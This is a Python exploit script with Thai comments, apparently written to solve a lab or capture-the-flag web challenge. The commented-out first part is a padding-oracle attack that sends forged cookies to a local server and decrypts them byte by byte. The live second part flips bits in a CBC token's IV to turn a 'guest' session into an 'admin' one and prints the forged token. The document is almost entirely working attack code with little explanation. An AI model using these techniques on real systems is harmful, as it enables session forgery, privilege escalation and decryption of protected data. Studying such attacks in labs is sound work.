import requests
import base64

# # --- ตั้งค่าตรงนี้ ---
# TARGET_URL = "http://192.168.109.131:8085/" 
# # ใส่ Cookie ที่คุณสงสัย (ต้องเป็นตัวที่ยาวๆ ไม่ใช่ PHPSESSID)
# # ตัวอย่าง: 'auth=67as8d6f...'
# CIPHERTEXT_B64 = "9o65dh04r2us5vrkvk1sckb2a3" 
# BLOCK_SIZE = 16 

# def is_oracle_happy(payload_b64):
#     """ฟังก์ชันตรวจว่า Server ตอบกลับมายังไง"""
#     cookies = {'auth': payload_b64} # เปลี่ยนชื่อ 'auth' ให้ตรงกับในเว็บ
#     try:
#         r = requests.get(TARGET_URL, cookies=cookies, timeout=5)
#         # ลองเช็คดูว่าถ้า Padding ผิด Server พ่นอะไรออกมา
#         # บางทีอาจจะเป็น r.status_code == 200 หรือ "Invalid padding"
#         return "Padding Error" not in r.text 
#     except:
#         return False

# def solve():
#     raw_ct = base64.b64decode(CIPHERTEXT_B64)
#     blocks = [raw_ct[i:i+BLOCK_SIZE] for i in range(0, len(raw_ct), BLOCK_SIZE)]
    
#     # เราจะถอดรหัสทีละคู่ (บล็อกก่อนหน้า กับ บล็อกปัจจุบัน)
#     # Plaintext = Decrypt(Current) XOR Previous_Block
#     intermediate = bytearray(BLOCK_SIZE)
#     decoded_plaintext = ""

#     # สมมติถอดบล็อกสุดท้าย (ใช้บล็อกก่อนหน้าเป็นตัวล่อ)
#     prev_block = bytearray(blocks[-2])
#     curr_block = blocks[-1]

#     print(f"[*] เริ่มเจาะบล็อกสุดท้าย...")
#     for i in range(BLOCK_SIZE - 1, -1, -1):
#         expected_padding = BLOCK_SIZE - i
#         for candidate in range(256):
#             # สร้างบล็อกปลอม
#             fake_prev = bytearray(16)
#             # ตั้งค่า byte ที่เราหาได้แล้วให้ตรงกับ padding ที่ต้องการ
#             for j in range(i + 1, BLOCK_SIZE):
#                 fake_prev[j] = intermediate[j] ^ expected_padding
            
#             fake_prev[i] = candidate
            
#             # ส่งไปถาม Oracle
#             payload = base64.b64encode(fake_prev + curr_block).decode()
#             if is_oracle_happy(payload):
#                 intermediate[i] = candidate ^ expected_padding
#                 print(f"[+] พบ Byte ที่ {i}: {hex(intermediate[i] ^ prev_block[i])}")
#                 break
    
#     # ผลลัพธ์สุดท้าย
#     result = "".join(chr(intermediate[b] ^ prev_block[b]) for b in range(BLOCK_SIZE))
#     print(f"\n[!] ถอดรหัสสำเร็จ: {result}")

# if __name__ == "__main__":
#     solve()
    
    
    
import base64
import urllib.parse

# 1. นำค่า token ที่ก๊อปมา (URL-encoded) มาปลดล็อก
raw_token = "55qTaIQBh9jeOTl1J5WFLQ%3D%3D"
old_token_b64 = urllib.parse.unquote(raw_token)

# 2. ทำการ XOR: New_IV = Old_IV ^ "guest" ^ "admin"
token_bytes = bytearray(base64.b64decode(old_token_b64))
original = b"guest"
target = b"admin"

for i in range(len(target)):
    token_bytes[i] = token_bytes[i] ^ original[i] ^ target[i]

new_token = base64.b64encode(token_bytes).decode()
print(f"ค่า Token ใหม่ที่ต้องใส่: {new_token}")


    
## 9o65dh04r2us5vrkvk1sckb2a3

##ค่าที่ได้มามีตัวอักษร %2B และ %3D ซึ่งคือเครื่องหมาย + และ = ในรูปแบบ URL ให้คุณใช้สคริปต์นี้เพื่อหา New Token สำหรับปลอมเป็น Admin
## dp%2BlWfSWj3lK1fxfjpllRw%3D%3D -> cI6tQ+6Wj3lK1fxfjpllRw==

## INSERT INTO users (username, encrypted_pass) VALUES ('guest', 'MTIzNDU2Nzg5MDEyMzQ1Nh6969696969696969');